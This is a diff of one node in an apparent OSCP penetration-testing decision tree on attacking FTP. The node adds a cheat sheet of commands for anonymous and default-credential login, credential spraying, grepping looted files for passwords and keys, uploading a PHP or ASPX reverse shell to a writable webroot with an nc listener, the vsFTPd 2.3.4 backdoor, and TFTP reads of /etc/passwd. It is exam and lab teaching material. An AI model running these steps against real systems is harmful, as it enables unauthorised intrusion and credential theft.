@@ -1,22 +1,38 @@
 {
   "id": "ftp_enum",
   "phase": "FTP",
-  "title": "FTP Enumeration",
-  "body": "Anonymous login is more common than people expect. If writable AND web-accessible, you can drop a shell directly.",
-  "cmd": "# Anonymous login test\nftp $ip\n# Try: anonymous / anonymous\n#      anonymous / (blank)\n\n# Nmap scripts\nnmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $ip\n\n# If login works — download everything\nftp> binary\nftp> mget *\nftp> passive\n\n# If FTP dir is under webroot — upload shell\nftp> put shell.php",
-  "warn": null,
+  "title": "FTP — Enumeration, Anonymous Access, Credential Reuse, Webshell",
+  "body": "FTP on an OSCP box is almost always one of four things: anonymous login with files containing creds, anonymous login to a directory that's also the webroot (upload a shell), credential reuse from creds you found elsewhere, or a version-vulnerable FTP daemon. Anonymous is more common than you'd expect — try it before anything else. The writable-webroot path is the fastest shell you'll ever get: one ftp put and you're executing code.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — DETECT + ANONYMOUS LOGIN (always try first)\n# ══════════════════════════════════════════════════\nnmap --script ftp-anon,ftp-syst,ftp-bounce -p 21 <IP>\n# ftp-anon: Anonymous FTP login allowed → go directly to step 2\n\nftp <IP>\n# Username: anonymous  Password: anonymous  (or blank)\n# Also try: ftp / ftp,  guest / guest,  admin / admin\n\n# ══════════════════════════════════════════════════\n# 2 — ONCE LOGGED IN: enumerate thoroughly\n# ══════════════════════════════════════════════════\nftp> ls -la              # list including hidden files\nftp> pwd                 # where are you on the filesystem?\nftp> binary              # ALWAYS set binary mode before downloading\nftp> passive             # use passive mode if transfers hang\nftp> mget *              # download everything in current dir\nftp> cd ..               # traverse up if permissions allow\nftp> ls -la              # re-list at each level\n\n# ══════════════════════════════════════════════════\n# 3 — CREDENTIAL REUSE (have creds from elsewhere)\n# ══════════════════════════════════════════════════\n# If you found creds in SMB, web app, a config file:\nftp <IP>\n# Try those creds — FTP often shares passwords with SSH/web accounts\n# Also try variations: user/user, user/pass123, user/company123\n\n# nxc for spray:\nnxc ftp <IP> -u users.txt -p passwords.txt\n\n# ══════════════════════════════════════════════════\n# 4 — LOOT: what to look for in FTP files\n# ══════════════════════════════════════════════════\n# After mget * — search everything you pulled:\ngrep -ri 'password\\|passwd\\|secret\\|key\\|cred\\|user' . 2>/dev/null\nfind . -name '*.conf' -o -name '*.ini' -o -name '*.php' -o -name '*.txt' | xargs grep -l 'pass' 2>/dev/null\nfind . -name '*.bak' -o -name '*.old' -o -name '*.backup' 2>/dev/null\n# SSH keys:\nfind . -name 'id_rsa' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null\n\n# ══════════════════════════════════════════════════\n# 5 — WRITABLE + WEBROOT = INSTANT SHELL\n# ══════════════════════════════════════════════════\n# Test if the FTP dir is writable:\nftp> put test.txt\n# If it succeeds → you can write files\n# Is it under the webroot? Check the pwd output from step 2:\n#   /var/www/html  → Apache/Nginx webroot\n#   C:\\inetpub\\wwwroot → IIS webroot\n#   /srv/http,  /usr/share/nginx/html  → other web roots\n\n# If writable AND webroot → upload a webshell:\n# On Kali:\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php\n# Edit shell.php — set $ip and $port to yours\nftp> binary\nftp> put shell.php\n# Start listener: nc -lvnp 443\n# Trigger: curl http://<IP>/shell.php\n\n# ASPX for IIS:\ncp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\nftp> put shell.aspx\n# Visit: http://<IP>/shell.aspx\n\n# ══════════════════════════════════════════════════\n# 6 — VERSION EXPLOIT\n# ══════════════════════════════════════════════════\n# Banner grab:\nnc -nv <IP> 21                    # read the banner\nftp <IP>                          # VERSION shows at login\n# vsFTPd 2.3.4 → backdoor (CVE-2011-2523): try user with :) suffix\n#   USER user:)  PASS anything → check if port 6200 opens\nsearchsploit vsftpd\nsearchsploit proftpd\n\n# ══════════════════════════════════════════════════\n# 7 — TFTP (UDP 69 — often missed)\n# ══════════════════════════════════════════════════\n# nmap may miss it — scan explicitly:\nnmap -sU -p 69 <IP>\n# If open: no auth, read/write by default on many configs\ntftp <IP>\ntftp> get /etc/passwd\ntftp> put nc.exe nc.exe           # drop tools directly",
+  "warn": "Always set binary mode before any transfer — ASCII mode corrupts non-text files silently and you'll waste time debugging a 'broken' executable that's actually a transfer encoding issue. The writable-webroot shell is the fastest path on any box with both FTP and a web service — check if they share a filesystem before spending time on anything else. vsFTPd 2.3.4 is a common OSCP box version — the backdoor requires the :) username trick and checking port 6200 after auth, not a typical exploit script.",
   "choices": [
     {
-      "label": "Anonymous access — found interesting files",
-      "next": "smb_loot"
+      "label": "Anonymous access — download and hunt for creds",
+      "next": "creds_found"
     },
     {
-      "label": "FTP writable + webroot accessible = shell",
+      "label": "Writable webroot — uploaded a shell",
       "next": "reverse_shell"
     },
     {
-      "label": "Need creds",
+      "label": "Found SSH key or creds in FTP files",
+      "next": "ssh_key"
+    },
+    {
+      "label": "Have creds — trying them on SSH/other services",
+      "next": "use_creds_first"
+    },
+    {
+      "label": "vsFTPd 2.3.4 — backdoor attempt",
+      "next": "analyze_versions"
+    },
+    {
+      "label": "Need to brute force FTP creds",
       "next": "bruteforce"
+    },
+    {
+      "label": "Back to service enum",
+      "next": "jump_services"
     }
   ]
 }
